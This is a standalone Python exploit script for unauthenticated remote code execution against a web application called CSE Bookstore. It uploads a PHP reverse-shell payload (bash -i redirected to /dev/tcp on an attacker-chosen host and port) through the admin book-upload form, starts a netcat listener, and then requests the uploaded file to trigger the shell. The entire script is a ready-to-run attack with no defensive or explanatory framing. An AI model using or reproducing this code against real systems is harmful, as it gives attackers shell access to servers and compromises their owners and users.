#!/usr/bin/env python3

import nc
import requests
import argparse
import sys
from time import sleep

parser = argparse.ArgumentParser(description="----- CSE Bookstore Unauthenticated RCE -----")
parser.add_argument('-u', '--url', help="URL to CSE Bookstore.")
parser.add_argument('-l', '--lhost', help="Local host for a reverse shell.")
parser.add_argument('-p', '--lport', help="Local port for a reverse shell.")
args = parser.parse_args()
url = args.url
lhost = args.lhost
lport = args.lport

# EXPLOIT
class RCE:
    # Establish connection
    def __init__(self):
        self.RED = '\033[31m'
        self.END = '\033[0m'
        self.BLUE = '\033[94m'
        self.lhost = lhost
        self.lport = lport
        self.url = url
        self.s = requests.Session()
        self.rev = f'<?php system("bash -c \'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\'"); ?>'
        # Checking connection
        print(f"{self.BLUE}[*]{self.END} Checking connection: {self.url}")
        sleep(0.5)
        try:
            request = self.s.get(self.url, timeout=4)
            if request.status_code == 200:
                pass
            else:
                print(f"{self.RED}[!]{self.END} Failed to establish the connection ... Exit")
                sleep(0.5)
                sys.exit(1)
        except:
            print(f"{self.RED}[!]{self.END} Unknown error happened! Please check if the url is correct!.")
            sleep(0.5)
            sys.exit(1)

    def upload_shell(self, url, payload):
        files = {
            'image':('cmback.php', payload, 'application/x-php'),
            'add':(None, 'Add new book')
                }
        headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'}
        print(f"{self.BLUE}[*]{self.END} Uploading shell ...")
        sleep(0.5)
        self.s.post(url, files=files, headers=headers)

    def call_me(self, url):
        print(f"{self.BLUE}[*]{self.END} Triggering shell ...")
        sleep(0.5)
        nc.NetCat(self.lport).start()
        self.s.get(url)

    def main(self):
        upload_url = self.url + "/admin_add.php"
        shell_url = self.url + "/bootstrap/img/cmback.php"

        self.upload_shell(upload_url, self.rev)
        self.call_me(shell_url)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"\033[94m[*]\033[0m Usage: python3 cse_bookstore.py http://bookstore.example\n")
    else:
        RCE().main()


